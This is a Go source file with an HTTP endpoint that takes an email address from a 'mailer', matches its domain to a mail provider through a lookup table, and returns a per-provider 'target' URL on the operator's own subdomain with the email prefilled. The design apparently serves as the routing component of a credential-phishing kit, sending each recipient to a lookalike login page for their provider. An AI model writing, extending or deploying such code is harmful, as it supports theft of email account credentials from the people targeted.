package main

import (
	"encoding/json"
	"log"
	"net/http"
	"strings"
)

// DetectRequest accepts an explicit provider from the client/mailer.
// MailDomain is metadata for custom/self-hosted mail systems; this detector
// does not probe it or perform network discovery.
type DetectRequest struct {
	Email      string `json:"email"`
	Provider   string `json:"provider,omitempty"`
	MailDomain string `json:"mail_domain,omitempty"`
}

type DetectResponse struct {
	Target     string `json:"target"`
	TargetURL  string `json:"target_url"`
	Domain     string `json:"domain"`
	Provider   string `json:"provider"`
	MailDomain string `json:"mail_domain,omitempty"`
}

func handleDetect(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		handleCORSOptions(w, r)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req DetectRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	email := strings.ToLower(strings.TrimSpace(req.Email))
	parts := strings.SplitN(email, "@", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		http.Error(w, "Invalid email", http.StatusBadRequest)
		return
	}
	domain := strings.TrimRight(strings.ToLower(strings.TrimSpace(parts[1])), "=")
	baseDomain := baseDomainOf(r)

	provider := strings.ToLower(strings.TrimSpace(req.Provider))
	mailDomain := strings.ToLower(strings.TrimSpace(req.MailDomain))

	if provider == "" {
		if explicitProvider, explicitMailDomain, ok := explicitProviderForDomain(domain); ok {
			provider = explicitProvider
			if mailDomain == "" {
				mailDomain = explicitMailDomain
			}
		}
	}

	if provider == "" {
		if staticProvider, matched := detectProvider(domain); matched {
			provider = staticProvider
		}
	}

	if provider == "" {
		http.Error(w, "Provider required", http.StatusUnprocessableEntity)
		return
	}

	target := providerToTarget(provider)
	t, ok := targets[target]
	if !ok {
		log.Printf("[detect] explicit provider %q maps to unavailable target %q", provider, target)
		http.Error(w, "Provider target unavailable", http.StatusUnprocessableEntity)
		return
	}

	writeDetect(w, DetectResponse{
		Target:     target,
		TargetURL:  "https://" + t.EntrySubdomainFor(baseDomain) + "/#" + email,
		Domain:     domain,
		Provider:   provider,
		MailDomain: mailDomain,
	})
}

func writeDetect(w http.ResponseWriter, resp DetectResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

var knownDomains = map[string]string{
	"outlook.com": "msa",
	"hotmail.com": "msa",
	"live.com":    "msa",
	"msn.com":     "msa",
	"passport.com": "msa",
	"yahoo.com":      "yahoo",
	"ymail.com":      "yahoo",
	"rocketmail.com": "yahoo",
	"yahoo.co.uk":    "yahoo",
	"yahoo.ca":       "yahoo",
	"yahoo.fr":       "yahoo",
	"yahoo.de":       "yahoo",
	"yahoo.es":       "yahoo",
	"yahoo.it":       "yahoo",
	"turbify.com":      "turbify",
	"rackspace.com":    "rackspace",
	"protonmail.com":   "protonmail",
	"proton.me":        "protonmail",
	"pm.me":            "protonmail",
	"zoho.com":         "zoho",
	"zohomail.com":     "zoho",
	"fastmail.com":     "fastmail",
	"tuta.com":         "tuta",
	"tutanota.com":     "tutanota",
	"mail.com":         "mailcom",
	"gmx.com":          "gmx",
	"yandex.com":       "yandex",
	"yandex.ru":        "yandex",
	"infomaniak.com":   "infomaniak",
	"runbox.com":       "runbox",
	"mailbox.org":      "mailbox",
	"secureserver.net": "godaddy",
	"godaddy.com":      "godaddy",
	"ionos.com":        "ionos",
	"1and1.com":        "ionos",
	"namecheap.com":    "namecheap",
	"privateemail.com": "namecheap",
	"webmail.co.za":    "webmailza",
}

func detectProvider(domain string) (string, bool) {
	domain = strings.ToLower(strings.TrimSpace(domain))
	if domain == "" {
		return "", false
	}

	if provider, _, ok := explicitProviderForDomain(domain); ok {
		return provider, true
	}
	provider, ok := knownDomains[domain]
	return provider, ok
}

func probeCpanel(domain string) (bool, string) {
	return false, ""
}

func providerToTarget(provider string) string {
	switch strings.ToLower(strings.TrimSpace(provider)) {
	case "microsoft":
		return "microsoft"
	case "msa":
		return "msa"
	case "yahoo":
		return "yahoo"
	case "turbify":
		return "turbify"
	case "rackspace":
		return "rackspace"
	case "zoho":
		return "zoho"
	case "protonmail", "proton":
		return "proton"
	case "fastmail":
		return "fastmail"
	case "tuta":
		return "tuta"
	case "tutanota":
		return "tutanota"
	case "mailcom":
		return "mailcom"
	case "gmx":
		return "gmx"
	case "yandex":
		return "yandex"
	case "infomaniak":
		return "infomaniak"
	case "runbox":
		return "runbox"
	case "mailbox":
		return "mailbox"
	case "godaddy":
		return "godaddy"
	case "ionos":
		return "ionos"
	case "namecheap":
		return "namecheap"
	case "webmailza":
		return "webmailza"
	case "cpanel", "roundcube", "webmail", "custom":
		return "cpanel"
	default:
		return strings.ToLower(strings.TrimSpace(provider))
	}
}
